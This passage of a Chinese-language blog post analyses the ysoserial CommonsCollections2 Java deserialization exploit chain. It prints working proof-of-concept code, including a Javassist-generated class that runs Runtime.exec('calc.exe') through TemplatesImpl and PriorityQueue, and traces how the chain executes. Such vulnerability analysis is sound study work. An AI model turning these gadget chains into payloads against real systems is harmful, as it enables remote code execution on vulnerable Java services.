+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">Tcomparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformerChain);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(queue,Tcomparator);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc2.txt&quot;</span>));</span><br><span class="line">            outputStream.writeObject(queue);</span><br><span class="line">            outputStream.close();</span><br><span class="line">            System.out.println(barr.toString());</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;cc2.txt&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Javassit补充"><a href="#Javassit补充" class="headerlink" title="Javassit补充"></a>Javassit补充</h2><p><strong>简述：</strong><br>Javassist是一个开源的分析、编辑和创建Java字节码的类库，可以直接编辑和生成Java生成的字节码。<br>能够在运行时定义新的Java类，在JVM加载类文件时修改类的定义。<br>Javassist类库提供了两个层次的API，源代码层次和字节码层次。源代码层次的API能够以Java源代码的形式修改Java字节码。字节码层次的API能够直接编辑Java类文件。 </p>
+<p>下面大概讲一下POC中会用到的类和方法：</p>
+<p><strong>ClassPool</strong><br>ClassPool是CtClass对象的容器，它按需读取类文件来构造CtClass对象，并且保存CtClass对象以便以后使用，其中键名是类名称，值是表示该类的CtClass对象。</p>
+<p>常用方法：</p>
+<ul>
+<li><code>static ClassPool getDefault()</code>：返回默认的ClassPool，一般通过该方法创建我们的ClassPool；</li>
+<li><code>ClassPath insertClassPath(ClassPath cp)</code>：将一个ClassPath对象插入到类搜索路径的起始位置；</li>
+<li><code>ClassPath appendClassPath</code>：将一个ClassPath对象加到类搜索路径的末尾位置；</li>
+<li><code>CtClass makeClass</code>：根据类名创建新的CtClass对象；</li>
+<li><code>CtClass get(java.lang.String classname)</code>：从源中读取类文件，并返回对CtClass 表示该类文件的对象的引用；</li>
+</ul>
+<p><strong>CtClass</strong><br>CtClass类表示一个class文件，每个CtClass对象都必须从ClassPool中获取。</p>
+<p>常用方法：</p>
+<ul>
+<li><code>void setSuperclass(CtClass clazz)</code>：更改超类，除非此对象表示接口；</li>
+<li><code>byte[] toBytecode()</code>：将该类转换为类文件；</li>
+<li><code>CtConstructor makeClassInitializer()</code>：制作一个空的类初始化程序（静态构造函数）；</li>
+</ul>
+<p><strong>示例代码</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">javassit_test</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">createPerson</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">//实例化一个ClassPool容器</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="comment">//新建一个CtClass，类名为Cat</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Cat&quot;</span>);</span><br><span class="line">        <span class="comment">//设置一个要执行的命令</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;System.out.println(\&quot;javassit_test succes!\&quot;);&quot;</span>;</span><br><span class="line">        <span class="comment">//制作一个空的类初始化，并在前面插入要执行的命令语句</span></span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        <span class="comment">//重新设置一下类名</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">randomClassName</span> <span class="operator">=</span> <span class="string">&quot;EvilCat&quot;</span> + System.nanoTime();</span><br><span class="line">        cc.setName(randomClassName);</span><br><span class="line">        <span class="comment">//将生成的类文件保存下来</span></span><br><span class="line">        cc.writeFile();</span><br><span class="line">        <span class="comment">//加载该类</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> cc.toClass();</span><br><span class="line">        <span class="comment">//创建对象</span></span><br><span class="line">        c.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            createPerson();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>新生成的类是这样子的，其中有一块static代码；<br><img src="/./images/1630999667462.png" alt="enter description here">[17-1]</p>
+<p>当该类被实例化的时候，就会执行static里面的语句；<br><img src="/./images/1630999809019.png" alt="enter description here">[17-2]</p>
+<h2 id="利用链2分析"><a href="#利用链2分析" class="headerlink" title="利用链2分析"></a>利用链2分析</h2><p>在ysoserial的cc2中引入了 TemplatesImpl 类来进行承载攻击payload，需要用到javassit；</p>
+<p>先给出POC：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test2</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.commons.collections4.functors.InvokerTransformer&quot;</span>).getDeclaredConstructor(String.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">transformer</span> <span class="operator">=</span> (InvokerTransformer) constructor.newInstance(<span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">Tcomparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformer);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Cat&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        <span class="type">String</span> <span class="variable">randomClassName</span> <span class="operator">=</span> <span class="string">&quot;EvilCat&quot;</span> + System.nanoTime();</span><br><span class="line">        cc.setName(randomClassName);</span><br><span class="line">        <span class="comment">//cc.writeFile();</span></span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="type">byte</span>[] classBytes = cc.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] targetByteCodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;classBytes&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, targetByteCodes);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;blckder02&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_class&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        Object[] queue_array = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates,<span class="number">1</span>&#125;;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">queue_field</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">        queue_field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        queue_field.set(queue,queue_array);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">size</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="string">&quot;size&quot;</span>);</span><br><span class="line">        size.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        size.set(queue,<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">comparator_field</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        comparator_field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        comparator_field.set(queue,Tcomparator);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./cc2.bin&quot;</span>));</span><br><span class="line">            outputStream.writeObject(queue);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;./cc2.bin&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><strong>代码1</strong><br>通过反射实例化InvokerTransformer对象，设置InvokerTransformer的methodName为<code>newTransformer</code>；</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.commons.collections4.functors.InvokerTransformer&quot;</span>).getDeclaredConstructor(String.class);</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">transformer</span> <span class="operator">=</span> (InvokerTransformer)  onstructor.newInstance(<span class="string">&quot;newTransformer&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p><strong>代码2</strong><br>实例化一个TransformingComparator对象，将transformer传进去；<br>实例化一个PriorityQueue对象，传入不小于1的整数，comparator参数就为null；</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TransformingComparator</span> <span class="variable">Tcomparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformer);</span><br><span class="line"><span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+
+<p><strong>代码3</strong><br>这里就要用到javassit的知识；</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//实例化一个ClassPool容器</span></span><br><span class="line"><span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"><span class="comment">//向pool容器类搜索路径的起始位置插入AbstractTranslet.class</span></span><br><span class="line">pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line"><span class="comment">//新建一个CtClass，类名为Cat</span></span><br><span class="line"><span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Cat&quot;</span>);</span><br><span class="line"><span class="comment">//设置一个要执行的命令</span></span><br><span class="line"><span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>;</span><br><span class="line"><span class="comment">//制作一个空的类初始化，并在前面插入要执行的命令语句</span></span><br><span class="line">cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line"><span class="comment">//重新设置一下类名，生成的类的名称就不再是Cat</span></span><br><span class="line"><span class="type">String</span> <span class="variable">randomClassName</span> <span class="operator">=</span> <span class="string">&quot;EvilCat&quot;</span> + System.nanoTime();</span><br><span class="line">cc.setName(randomClassName);</span><br><span class="line"><span class="comment">//将生成的类文件保存下来</span></span><br><span class="line">cc.writeFile();</span><br><span class="line"><span class="comment">//设置AbstractTranslet类为该类的父类</span></span><br><span class="line">cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line"><span class="comment">//将该类转换为字节数组</span></span><br><span class="line"><span class="type">byte</span>[] classBytes = cc.toBytecode();</span><br><span class="line"><span class="comment">//将一维数组classBytes放到二维数组targetByteCodes的第一个元素</span></span><br><span class="line"><span class="type">byte</span>[][] targetByteCodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;classBytes&#125;;</span><br></pre></td></tr></table></figure>
+<p>这段代码会新建一个类，并添加了一个static代码块；<br><img src="/./images/1630998944944.png" alt="enter description here">[17-3]</p>
+<p><strong>代码4</strong><br>使用TemplatesImpl的空参构造方法实例化一个对象；<br>再通过反射对个字段进行赋值，为什么要这样赋值下面再说；</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, targetByteCodes);</span><br><span class="line">setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;blckder02&quot;</span>);</span><br><span class="line">setFieldValue(templates, <span class="string">&quot;_class&quot;</span>, <span class="literal">null</span>);</span><br></pre></td></tr></table></figure>
+
+<p><strong>代码5</strong><br>新建一个对象数组，第一个元素为templates，第二个元素为1；<br>然后通过反射将该数组传到queue中；</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Object[] queue_array = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates,<span class="number">1</span>&#125;;</span><br><span class="line"><span class="type">Field</span> <span class="variable">queue_field</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">queue_field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">queue_field.set(queue,queue_array);</span><br></pre></td></tr></table></figure>
+
+<p><strong>代码6</strong><br>通过反射将queue的size设为2，与POC1中使用两个add的意思一样；</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">size</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="string">&quot;size&quot;</span>);</span><br><span class="line">size.setAccessible(<span class="literal">true</span>);</span><br><span class="line">size.set(queue,<span class="number">2</span>);</span><br></pre></td></tr></table></figure>
+
+<p><strong>代码6</strong><br>通过反射给queue的comparator参数赋值；</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">comparator_field</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">comparator_field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">comparator_field.set(queue,Tcomparator);</span><br></pre></td></tr></table></figure>
+
+<p>从<code>PriorityQueue.readObject()</code>方法看起，queue变量就是我们传入的templates和1，size也是我们传入的2；<br><img src="/./images/1630933518507.png" alt="enter description here">[18]</p>
+<p>跟进siftDown方法，comparator参数就是我们传入的TransformingComparator实例化的对象；<br><img src="/./images/1630946219547.png" alt="enter description here">[19]</p>
+<p>到TransformingComparator的compare方法，obj1就是我们传入的templates， 这里的<code>this.transformer</code>就是我们传入的transformer；<br><img src="/./images/1630946367815.png" alt="enter description here">[20]</p>
+<p>跟到<code>InvokerTransformer.transform()</code>，input就是前面的obj1，<code>this.iMethodName</code>的值为传入的newTransformer，因为newTransformer方法中调用到了getTransletInstance方法；<br><img src="/./images/1630946837005.png" alt="enter description here">[21]</p>
+<p>接着调用templates的newTransformer方法，而templates是TemplatesImpl类的实例化对象，也就是调用了<code>TemplatesImpl.newTransformer()</code>；<br>跟踪该方法；<br><img src="/./images/1630947131676.png" alt="enter description here">[22]</p>
+<p>继续跟踪getTransletInstance方法；<br>进行if判断，<code>_name</code>不为空，<code>_class</code>为空，才能进入defineTransletClasses方法；<br>这就是代码4中赋值的原因；<br><img src="/./images/1630947486233.png" alt="enter description here">[23]</p>
+<p>跟进defineTransletClasses方法；<br><img src="/./images/1630947469140.png" alt="enter description here">[24]</p>
+<p><code>_bytecodes</code>也不能为null，是我们传入的targetByteCodes，也就是代码3的内容，转换成字节数组是一串这样子的；<br><img src="/./images/1630948147584.png" alt="enter description here">[25]</p>
+<p>继续往下；<br><img src="/./images/1630948297106.png" alt="enter description here">[26]</p>
+<p>通过<code>loader.defineClass</code>将字节数组还原为Class对象，<code>_class[0]</code>就是javassit新建的类<code>EvilCat1153850011981000</code>；<br><img src="/./images/1630998046771.png" alt="enter description here">[26-1]</p>
+<p>再获取它的父类，检测父类是否为<code>ABSTRACT_TRANSLET</code>，所以代码3中要设置AbstractTranslet类为新建类的父类；</p>
+<p>给<code>_transletIndex</code>赋值为0后，返回到getTransletInstance方法，创建<code>_class[_transletIndex]</code>的对象，即创建<code>EvilCat1153850011981000</code>类的对象，那么该类中的static代码部分就会执行，成功执行命令；<br><img src="/./images/1630948555101.png" alt="enter description here">[27]</p>
